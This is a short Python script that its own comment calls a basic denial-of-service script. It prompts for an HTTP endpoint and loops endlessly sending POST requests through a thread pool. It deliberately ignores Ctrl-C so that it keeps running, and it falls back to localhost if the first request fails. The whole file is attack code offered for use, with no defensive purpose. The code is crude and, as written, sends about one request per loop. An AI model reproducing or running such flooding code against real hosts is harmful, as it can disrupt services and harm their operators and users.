# An extremely basic denial of service script that wont work on anyone who knows what a firewall is


input("this one might be worse than the other script, press ctrl C now before its too late")


import requests
from concurrent.futures import ThreadPoolExecutor
data = 'hi'
endpoint = input('Enter http endpoint')
if not endpoint.startswith('http'):
    endpoint = 'http://' + endpoint
try:
    requests.post(endpoint, data=data)
except:
    endpoint = 'http://127.0.0.1:80'
def ddos(one, two):
    requests.post(one, data=two)

while 1:
    try:
        with ThreadPoolExecutor(max_workers=24) as executor:
            executor.map(ddos, [endpoint], [data])
    except KeyboardInterrupt:
        print("no")
        continue
    except Exception as e:
        print(f'Error: {e}')
        continue
